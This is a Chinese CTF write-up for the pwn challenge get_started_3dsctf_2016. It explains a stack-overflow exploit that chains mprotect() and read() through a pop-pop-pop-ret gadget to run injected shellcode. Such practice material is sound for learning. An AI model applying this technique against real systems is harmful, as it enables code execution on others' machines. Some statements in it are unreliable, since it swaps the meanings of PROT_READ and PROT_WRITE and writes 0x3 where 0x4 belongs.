buu-get_start_3dsctf_2016

发表于 2021-06-15 更新于 2021-12-22 分类于 pwn ， buu

分析

初探

main函数中存在明显的溢出漏洞，本题目又留出了后门函数，理论上来说通过栈溢出控制返回地址为后门函数，再在栈中放上指定的参数就能getflag。此方法在本地确实可行，但是远程会挂。。

更换思路

在ida中找到了mprotect()函数和read()函数

mprotect()函数可以用来修改一段指定内存区域的保护属性，所以可以用mprotect()函数修改一段内存属性为可读、可写、可执行，然后用read()向地址内写入shellcode，并返回到该地址即可getshell

解题

本题目要在执行完成mprotect()函数之后返回到read()函数，并且两个函数的参数都必须可控，所以要用到寄存器，在mprotect()函数执行完成后，返回到连续pop三个寄存器并返回的地址，就可以清理掉mprotect()执行的时候使用的参数，并且返回到read()，并且read的参数和返回地址可控。

简单了解一下 mprotect()

函数原型

mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。

prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：

PROT_READ：表示内存段内的内容可写；

PROT_WRITE：表示内存段内的内容可读；

PROT_EXEC：表示内存段中的内容可执行；

PROT_NONE：表示内存段中的内容根本没法访问。

那么第三个参数怎么控制呢？

如果你打开/ usr / include / asm-generic，打开mman-common.h，你会发现这些值。

可读可写可执行对应的整数为: 0x1|0x2|0x3=00000001|00000010|00000100=00000111=7
